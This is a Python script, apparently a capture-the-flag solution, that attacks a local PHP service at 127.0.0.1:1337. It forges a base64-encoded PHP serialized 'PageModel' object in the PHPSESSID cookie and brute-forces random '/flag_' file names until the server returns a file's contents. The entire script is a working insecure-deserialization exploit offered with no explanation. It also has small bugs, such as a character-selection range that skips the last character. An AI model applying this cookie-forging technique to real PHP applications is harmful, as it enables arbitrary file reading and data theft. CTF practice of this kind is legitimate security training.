import random,time,requests,base64

pool = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 
'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 
'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
'0','1','2','3','4','5','6','7','8','9']

def send_request(cookie: str) -> bool:
    res = requests.get("http://127.0.0.1:1337",cookies={"PHPSESSID":cookie})
    print(res)
    t = res.text
    if len(t) > 0:
        print("FLAG:",t)
        return True
    else:
        return False
while True:
    flag = "/flag_"
    for i in range(0,5):
        s = pool[random.randrange(0,len(pool)-1)]
        flag = flag + s
    print("Tyring flag",flag)
    cookie = '''O:9:"PageModel":1:{s:4:"file";s:11:"%s";}'''%flag
    print(cookie)
    cookie = str(base64.b64encode(cookie.encode("utf-8")),"utf-8")

    if send_request(cookie):
        break
    if flag == "flag_IMULm":
        print("the flag",flag)
        break
